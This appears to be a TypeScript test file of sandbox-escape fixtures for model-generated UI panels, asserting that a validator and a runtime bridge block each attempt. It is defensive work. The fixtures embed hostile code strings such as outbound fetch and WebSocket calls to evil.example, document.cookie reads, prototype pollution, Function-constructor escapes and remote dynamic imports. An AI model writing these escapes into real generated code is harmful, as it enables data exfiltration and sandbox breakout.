// THE HOSTILE-PANEL CORPUS (doc 08 §3) — APPEND-ONLY.
// Model output is attacker-controlled (doc 06 §1). Each fixture tries one
// escape and asserts it is stopped, at the layer that owns the guarantee:
//   - STATIC: the Validator rejects the panel before it can run (doc 06 §5).
//   - RUNTIME: a validator-passing panel is still contained by the Bridge
//     (identity, declared access, rate limits, strikes — doc 06 §3).
// Launch criterion L2 = this corpus green. If you find a bypass while
// developing: ADD THE FIXTURE FIRST, then fix (CLAUDE.md ground rule 6).
import { describe, expect, it } from "vitest";
import {
  Bridge, InProcessAsyncStore, validateMutationPlan,
  type MessagePortLike, type PanelManifest, type Query, type ValidatorContext,
} from "../src/index";
import { projectsRegistry } from "./helpers";
import { seededStore } from "./helpers";

// ---------- STATIC layer: the Validator ----------
const ctx = (): ValidatorContext => ({
  registry: projectsRegistry(), livePanelIds: ["project_table"],
});

function panelPlan(code: string, over: Record<string, unknown> = {}): unknown {
  return {
    api: 1, summary: "A panel.",
    user_facing_diff: [{ kind: "add_panel", detail: "p" }],
    clarifying_question: null, assumptions: [], migration: null,
    panels: [{
      panel_id: "hostile_panel", title: "H",
      placement: { region: "main", order: 0 }, code,
      declared_queries: [{ from: "projects" }], declared_writes: [],
      ...over,
    }],
    remove_panels: [], confidence: 0.9,
  };
}

const rejects = (code: string, over?: Record<string, unknown>): boolean =>
  validateMutationPlan(panelPlan(code, over), ctx()).length > 0;

describe("hostile corpus / STATIC (Validator rejects before execution)", () => {
  const staticEscapes: [string, string][] = [
    ["network: fetch",
      `export default function(clay){ fetch("https://evil.example"); }`],
    ["network: XMLHttpRequest",
      `export default function(clay){ new XMLHttpRequest(); }`],
    ["network: WebSocket",
      `export default function(clay){ new WebSocket("wss://evil.example"); }`],
    ["network: EventSource",
      `export default function(clay){ new EventSource("https://evil.example"); }`],
    ["parent access via window.parent",
      `export default function(clay){ window.parent.postMessage("x", "*"); }`],
    ["top access",
      `export default function(clay){ top.location = "https://evil.example"; }`],
    ["document/cookie exfiltration",
      `export default function(clay){ const c = document.cookie; }`],
    ["localStorage",
      `export default function(clay){ localStorage.setItem("x", "y"); }`],
    ["prototype pollution via __proto__",
      `export default function(clay){ const o = {}; o.__proto__.polluted = true; }`],
    ["constructor escape to Function",
      `export default function(clay){ const f = (()=>{}).constructor("return this")(); }`],
    ["dynamic import()",
      `export default function(clay){ import("https://evil.example/x.js"); }`],
    ["eval",
      `export default function(clay){ eval("1+1"); }`],
    ["Function constructor",
      `export default function(clay){ new Function("return 1")(); }`],
    ["timer busy-loop via setInterval",
      `export default function(clay){ setInterval(()=>{}, 1); }`],
    ["computed clay access to smuggle a method",
      `export default function(clay){ const k = "db"; clay[k].query({from:"projects"}); }`],
    ["computed forbidden member",
      `export default function(clay){ const o = {}; o["constructor"]; }`],
    ["undeclared-table query (exemplar-10 defect)",
      `export default function(clay){ clay.db.query({from:"secrets"}); }`],
    ["undeclared write table",
      `export default function(clay){ clay.db.insert("projects", {}); }`],
    ["postMessage to break out of the bridge",
      `export default function(clay){ postMessage("x", "*"); }`],
    ["Worker spawn",
      `export default function(clay){ new Worker("x.js"); }`],
  ];
  for (const [name, code] of staticEscapes) {
    it(`rejects ${name}`, () => expect(rejects(code)).toBe(true));
  }

  it("rejects string smuggling: a >4KB string literal (V6)", () => {
    expect(rejects(`export default function(clay){ const s = "${"x".repeat(5000)}"; }`)).toBe(true);
  });
  it("rejects deep-AST bombs (V6 depth cap)", () => {
    const deep = "[".repeat(60) + "1" + "]".repeat(60);
    expect(rejects(`export default function(clay){ const a = ${deep}; }`)).toBe(true);
  });
  it("rejects arity!=1 / no default export (V1)", () => {
    expect(rejects(`export default function(){}`)).toBe(true);
    expect(rejects(`function f(clay){}`)).toBe(true);
  });

  it("a benign panel with lookalike identifiers still passes", () => {
    const code = `export default function(clay){
      const fetching = 1, myWindow = 2, constructorName = 3;
      clay.ui.render(h("p", {}, String(fetching + myWindow + constructorName)));
    }`;
    expect(rejects(code)).toBe(false);
  });
});

// ---------- RUNTIME layer: the Bridge ----------
function portPair(): [MessagePortLike, MessagePortLike] {
  let a: ((m: unknown) => void) | null = null;
  let b: ((m: unknown) => void) | null = null;
  return [
    { send: m => queueMicrotask(() => b?.(m)), onMessage: cb => { a = cb; } },
    { send: m => queueMicrotask(() => a?.(m)), onMessage: cb => { b = cb; } },
  ];
}
const sleep = (ms: number): Promise<void> => new Promise(r => setTimeout(r, ms));

const DECLARED: Query = { from: "projects", where: [{ field: "status", op: "eq", value: "red" }] };

function panelClient(port: MessagePortLike, panelId: string): {
  call: (call: string, args: unknown[]) => Promise<unknown>;
  send: (raw: unknown) => void; messages: unknown[];
} {
  let seq = 0;
  const pending = new Map<number, { resolve: (v: unknown) => void; reject: (e: unknown) => void }>();
  const messages: unknown[] = [];
  port.onMessage(raw => {
    messages.push(raw);
    const m = raw as { seq?: number; ok?: boolean; result?: unknown; error?: unknown };
    if (typeof m.seq === "number" && typeof m.ok === "boolean") {
      const p = pending.get(m.seq); if (!p) return;
      pending.delete(m.seq);
      m.ok ? p.resolve(m.result) : p.reject(m.error);
    }
  });
  return {
    messages, send: raw => port.send(raw),
    call: (call, args) => new Promise((resolve, reject) => {
      const s = seq++; pending.set(s, { resolve, reject });
      port.send({ v: 1, panel: panelId, seq: s, call, args });
    }),
  };
}

async function attack(over: Partial<PanelManifest> = {}, limits = {}, hooks = {}): Promise<{
  c: ReturnType<typeof panelClient>; store: Awaited<ReturnType<typeof seededStore>>;
}> {
  const store = await seededStore();
  const bridge = new Bridge(new InProcessAsyncStore(store), hooks, limits);
  const [bridgeSide, panelSide] = portPair();
  const m: PanelManifest = {
    panelId: "hostile_panel", title: "H", placement: { region: "main", order: 0 },
    code: "export default function(clay){}", declaredQueries: [DECLARED],
    declaredWrites: [], ...over,
  };
  const c = panelClient(panelSide, m.panelId);
  await bridge.attachPanel(m, bridgeSide);
  await sleep(1);
  return { c, store };
}

describe("hostile corpus / RUNTIME (Bridge contains validator-passing panels)", () => {
  it("forged panel id in the payload is ignored + striked", async () => {
    let tripped = false;
    const { c, store } = await attack({}, { strikeLimit: 3 },
      { onBoundary: () => { tripped = true; } });
    c.send({ v: 1, panel: "some_other_panel", seq: 0, call: "db.query", args: [DECLARED] });
    await sleep(5);
    // no reply to the forged call, and it counted as a strike
    expect(c.messages.some(m => (m as { seq?: number }).seq === 0)).toBe(false);
    for (let i = 0; i < 3; i++)
      c.send({ v: 1, panel: "some_other_panel", seq: i, call: "db.query", args: [] });
    await sleep(5);
    expect(tripped).toBe(true);
    store.close();
  });

  it("undeclared query at runtime is refused even if code was dynamic", async () => {
    const { c, store } = await attack();
    await expect(c.call("db.query", [{ from: "projects" }]))
      .rejects.toMatchObject({ code: "E_VALIDATION" });
    await expect(c.call("db.query", [{ from: "projects",
      where: [{ field: "owner", op: "eq", value: "x" }] }]))
      .rejects.toMatchObject({ code: "E_VALIDATION" });
    store.close();
  });

  it("undeclared write table is refused (ADR-014)", async () => {
    const { c, store } = await attack();
    await expect(c.call("db.insert", ["projects", { name: "x" }]))
      .rejects.toMatchObject({ code: "E_VALIDATION" });
    store.close();
  });

  it("watch bomb trips E_LIMIT past the cap", async () => {
    const { c, store } = await attack({}, { maxWatches: 3 });
    for (let i = 0; i < 3; i++) await c.call("db.watch", [DECLARED, `w${i}`]);
    await expect(c.call("db.watch", [DECLARED, "w_over"]))
      .rejects.toMatchObject({ code: "E_LIMIT" });
    store.close();
  });

  it("call flood trips the per-minute rate limit", async () => {
    const { c, store } = await attack({}, { callsPerMin: 5 });
    for (let i = 0; i < 5; i++) await c.call("db.query", [DECLARED]);
    await expect(c.call("db.query", [DECLARED]))
      .rejects.toMatchObject({ code: "E_LIMIT" });
    store.close();
  });

  it("confirm spam is throttled (1 concurrent, N/min)", async () => {
    const { c, store } = await attack({}, { confirmsPerMin: 2 },
      { onConfirm: async () => true });
    await c.call("ui.confirm", ["ok?"]);
    await c.call("ui.confirm", ["ok?"]);
    await expect(c.call("ui.confirm", ["ok?"]))
      .rejects.toMatchObject({ code: "E_LIMIT" });
    store.close();
  });

  it("oversized event payload trips E_LIMIT", async () => {
    const { c, store } = await attack({}, { maxEventPayload: 128 });
    await expect(c.call("events.emit", ["evt", { big: "x".repeat(500) }]))
      .rejects.toMatchObject({ code: "E_LIMIT" });
    store.close();
  });

  it("emit flood trips the per-minute cap", async () => {
    const { c, store } = await attack({}, { emitsPerMin: 3 });
    for (let i = 0; i < 3; i++) await c.call("events.emit", ["evt", { i }]);
    await expect(c.call("events.emit", ["evt", {}]))
      .rejects.toMatchObject({ code: "E_LIMIT" });
    store.close();
  });

  it("malformed messages accumulate strikes and trip the boundary", async () => {
    let tripped = false;
    const { c, store } = await attack({}, { strikeLimit: 4 },
      { onBoundary: () => { tripped = true; } });
    for (const junk of [42, "x", { garbage: true }, { v: 2 }])
      c.send(junk);
    await sleep(5);
    expect(tripped).toBe(true);
    store.close();
  });
});
